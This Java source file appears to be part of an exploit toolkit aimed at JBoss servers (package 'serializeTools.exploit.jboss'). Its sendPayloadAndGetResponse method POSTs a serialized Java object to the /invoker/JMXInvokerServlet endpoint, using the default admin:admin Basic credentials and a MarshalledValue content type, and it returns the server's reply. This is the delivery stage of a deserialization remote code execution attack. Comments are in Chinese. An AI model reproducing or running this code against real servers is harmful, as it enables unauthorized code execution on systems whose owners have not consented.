package serializeTools.exploit.jboss;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class SendPayload {
	private static final SendPayload instance = new SendPayload();

	public static SendPayload getInstance() {
		return instance;
	}

	public HttpResponse getResponse(String targetUrl) throws Exception, IOException {
		CloseableHttpClient httpClient = HttpClients.createDefault();
		HttpGet httpGet = new HttpGet(targetUrl);
		HttpResponse response = httpClient.execute(httpGet);
		return response;
	}

	public byte[] sendPayloadAndGetResponse(String targetUrl,byte[] payload) throws IOException, ClassNotFoundException {
		URL url = new URL(targetUrl + "/invoker/JMXInvokerServlet");
		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
		// //设置连接属性
		httpConn.setDoOutput(true);// 使用 URL 连接进行输出
		httpConn.setDoInput(true);// 使用 URL 连接进行输入
		httpConn.setUseCaches(false);// 忽略缓存
		httpConn.setRequestMethod("POST");// 设置URL请求方法
		httpConn.setRequestProperty("Connection", "Keep-Alive");// 维持长连接
		httpConn.setRequestProperty("Authorization", "Basic YWRtaW46YWRtaW4=");
		httpConn.setRequestProperty("Content-length", String.valueOf(payload.length));
		httpConn.setRequestProperty("Upgrade-Insecure-Requests", "1");
		httpConn.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36");
		httpConn.setRequestProperty("Content-Type","application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");

		OutputStream outputStream = httpConn.getOutputStream();
		outputStream.write(payload);
		outputStream.close();
		byte[] resultByte=input2byte(httpConn.getInputStream());

		return resultByte;
	}


	public final byte[] input2byte(InputStream inStream) throws IOException {
		ByteArrayOutputStream swapStream = new ByteArrayOutputStream();
		byte[] buff = new byte[100];
		int rc = 0;
		while ((rc = inStream.read(buff, 0, 100)) > 0) {
			swapStream.write(buff, 0, rc);
		}
		byte[] in2b = swapStream.toByteArray();
		return in2b;
	}
}
